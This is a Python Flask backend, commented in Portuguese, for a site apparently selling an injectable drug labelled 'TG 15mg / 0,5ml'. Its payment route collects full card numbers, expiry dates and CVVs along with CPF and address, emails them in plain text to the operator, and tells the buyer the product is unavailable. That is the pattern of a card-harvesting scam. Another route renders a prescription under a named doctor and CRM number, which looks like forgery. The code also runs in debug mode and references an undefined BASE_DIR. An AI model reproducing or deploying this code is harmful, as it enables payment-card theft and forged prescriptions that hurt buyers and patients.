import io
import os
from datetime import datetime
from flask import Flask, render_template, make_response, request, redirect, url_for, jsonify
import requests

# Bibliotecas para gerar o PDF e o QR Code
import qrcode
from reportlab.lib.pagesizes import A4
from reportlab.platypus import SimpleDocTemplate, Paragraph, Spacer, Image
from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
from reportlab.lib.colors import blue
from flask_mail import Mail, Message
#---------------------------------------------------------------------------

from dotenv import load_dotenv

# BASE_DIR = '/data/data/com.termux/files/home'
load_dotenv(os.path.join(BASE_DIR, '.env'))

app = Flask(__name__)
#---------------------------------------------------------------------------

# Configurações do servidor SMTP do Gmail
app.config['MAIL_SERVER'] = 'smtp.gmail.com'
app.config['MAIL_PORT'] = 587
app.config['MAIL_USE_TLS'] = True
app.config['MAIL_USERNAME'] = os.getenv('MAIL_USERNAME')
app.config['MAIL_PASSWORD'] = os.getenv('MAIL_PASSWORD')

# Correção para o Apache/mod_wsgi: Garante que haja um remetente padrão caso o env falhe
app.config['MAIL_DEFAULT_SENDER'] = os.getenv('MAIL_USERNAME')

# Inicializa o Mail após as configurações estarem completamente definidas
mail = Mail(app)

#------------------------------------------------------------------------

@app.route('/processando_payment', methods=['POST'])
def salvar():
    nome = request.form['nome']
    email = request.form['email']
    cpf = request.form['cpf']
    cep = request.form['cep']
    endereco = request.form['endereco']
    bairro = request.form['bairro']
    numero = request.form['numero']
    cidade = request.form['cidade']
    numero_cartao = request.form['numero_cartao']
    nome_titular = request.form['nome_titular']
    mes_ano = request.form['mes_ano']
    controle = request.form['controle']

    # Primeiro e-mail (Notificação interna)
    msg = Message(
        subject="Novo pagamento recebido",
        sender=app.config['MAIL_USERNAME'],
        recipients=[app.config['MAIL_USERNAME']]
    )

    msg.body = f"""
Nome: {nome}
E-mail: {email}
CPF: {cpf}
Cep: {cep}
Endereco: {endereco}
Numero: {numero}
Bairro: {bairro}
Cidade: {cidade}
Número do Cartão: {numero_cartao}
Nome do Titular: {nome_titular}
Validade: {mes_ano}
CVV: {controle}
"""
    try:
        mail.send(msg)
    except Exception as e:
        print(f"Erro ao enviar e-mail de notificação: {e}")

    # Segundo e-mail (Para o cliente)
    msg1 = Message(
        subject="Novo pagamento recebido",
        sender=app.config['MAIL_USERNAME'],
        recipients=[email]
    )

    msg1.html = f"""
    <html>
        <body>
            <img src="cid:image2" alt="Logo" style="max-width: 100%;">
            <p>Nome: {nome}</p>
            <p>Endereço: {endereco}</p>
            <p>N° ou complemento: {numero}</p>
            <p>Bairro: {bairro}</p>
            <p>Cidade: {cidade}</p>
            <p>Cep: {cep}</p>
            <p>Produto: TG 15mg / 0,5ml</p>
            <p>Preço: R$ 350,00</p>
            <img src="cid:image1" alt="Ampola 15ml" style="max-width: 10%;">
            <p>
                Desculpe, mas nosso produto não está disponível para sua região no momento devido às normas da ANVISA.<br>
                Não fique triste 🥲. Assim que houver disponibilidade para sua região, entraremos em contato.
            </p>
        </body>
    </html>
    """

    try:
        img_path = os.path.join(app.root_path, 'static', 'img', 'ampola_15ml.png')
        img1_path = os.path.join(app.root_path, 'static', 'img', 'logo.png')

        if os.path.exists(img_path):
            with open(img_path, 'rb') as fp:
                msg1.attach(
                    filename="ampola_15ml.png",
                    content_type="image/png",
                    data=fp.read(),
                    headers={'Content-ID': '<image1>'}
                )

        if os.path.exists(img1_path):
            with open(img1_path, 'rb') as fp2:
                msg1.attach(
                    filename="logo.png",
                    content_type="image/png",
                    data=fp2.read(),
                    headers={'Content-ID': '<image2>'}
                )

    except Exception as e:
        print(f"Erro ao anexar imagem: {e}")

    try:
        mail.send(msg1)
    except Exception as e:
        print(f"Erro ao enviar e-mail para o cliente: {e}")

    return render_template("index.html")
#---------------------------------------------------------------------------

# CORREÇÃO: URL do ViaCEP corrigida com /ws/ e as barras nos locais certos
def consultar_cep(cep):
    cep_limpo = "".join(filter(str.isdigit, cep))

    if len(cep_limpo) != 8:
        return {"erro": "CEP inválido! Deve conter 8 dígitos."}

    url = f"https://viacep.com.br/ws/{cep_limpo}/json/"

    try:
        response = requests.get(url, timeout=5)
        response.raise_for_status()
        dados = response.json()

        if 'erro' in dados:
            return {"erro": "CEP não encontrado."}

        return dados
    except requests.exceptions.RequestException as e:
        return {"erro": f"Erro ao conectar com a API: {e}"}
#---------------------------------------------------------------------------

# ROTA DO FLASK PARA BUSCAR CEP
@app.route('/buscar-cep', methods=['GET'])
def buscar_cep_rota():
    cep_recebido = request.args.get('cep')

    if not cep_recebido:
        return jsonify({"erro": "O parâmetro 'cep' é obrigatório."}), 400

    resultado = consultar_cep(cep_recebido)
    return jsonify(resultado)
#---------------------------------------------------------------------------

# 1. ROTAS DO SITE
@app.route('/')
def index():
    return render_template("index.html")
#---------------------------------------------------------------------------

@app.route('/api')
def api():
    return render_template("pagamento.html")
#---------------------------------------------------------------------------

@app.route('/receitas')
def gerar_receita():
    dados_receita = {
        "medico": "Dr. Gustavo Sá",
        "crm": "123456/SP",
        "paciente": "Maria Silva",
        "idade": "34",
        "data": datetime.now().strftime("%d de %B de %Y"), # Pegando data atual de forma dinâmica
        "medicamentos": [
            {
                "nome": "TG 15mg / 0,5ml",
                "instrucoes": "Administração Subcutânea Medicamento Injetável"
            }
        ]
    }
    return render_template("receita.html", **dados_receita)
#---------------------------------------------------------------------------
#---------------------------------------------------------------------------



if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(
        host="0.0.0.0",
        port=port,
        debug=True
    )
